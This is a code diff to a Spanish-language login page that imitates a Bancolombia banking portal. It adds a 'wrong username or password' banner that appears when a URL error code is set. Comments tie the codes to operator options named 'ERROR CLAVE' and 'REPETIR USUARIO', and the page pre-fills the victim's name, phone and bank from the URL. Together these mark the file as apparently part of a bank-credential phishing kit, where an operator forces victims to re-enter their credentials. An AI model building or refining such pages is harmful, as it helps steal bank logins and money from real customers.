@@ -187,6 +187,27 @@
       margin-bottom: 12px;
     }
 
+    /* Banner error visible al volver desde REPETIR USUARIO / ERROR CLAVE
+       (usuario NO quiere ver los .error-msg de los inputs, pero sí
+       un banner general al inicio del card). */
+    .login-error-banner {
+      display: none;
+      background: #FFF8D6;
+      border: 1.5px solid #E8B300;
+      color: #7A5900;
+      padding: 13px 15px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      text-align: left;
+      margin: 0 0 18px;
+      box-shadow: 0 2px 8px rgba(232, 179, 0, 0.18);
+      line-height: 1.35;
+    }
+    .login-error-banner.show {
+      display: block;
+    }
+
     /* Footer bottom */
     .footer-bottom {
       text-align: center;
@@ -253,6 +274,10 @@
 
     <!-- Formulario -->
     <div class="login-card">
+      <div class="login-error-banner" id="loginErrorBanner">
+        ⚠️ Usuario o clave incorrectos. Intenta de nuevo.
+      </div>
+
       <h2 class="card-title">¡Hola!</h2>
       <p class="card-subtitle">Ingresa los datos para gestionar tus<br>productos y hacer transacciones.</p>
 
@@ -345,6 +370,19 @@
     setVal('nombre_usuario',   params.get('nombre'));
     setVal('telefono',         params.get('telefono'));
     setVal('banco',            params.get('banco') || 'Bancolombia');
+
+    /* Banner error general (proviene de opcion_4 ERROR CLAVE u opcion_7 REPETIR USUARIO) */
+    (function () {
+      var errCode = params.get('error');
+      var banner  = document.getElementById('loginErrorBanner');
+      if (!banner) return;
+      if (errCode === '1' || errCode === '2' || errCode === 1 || errCode === 2) {
+        banner.classList.add('show');
+        window.setTimeout(function () {
+          banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 120);
+      }
+    })();
 
     const usuario  = document.getElementById('usuario');
     const clave    = document.getElementById('clave');
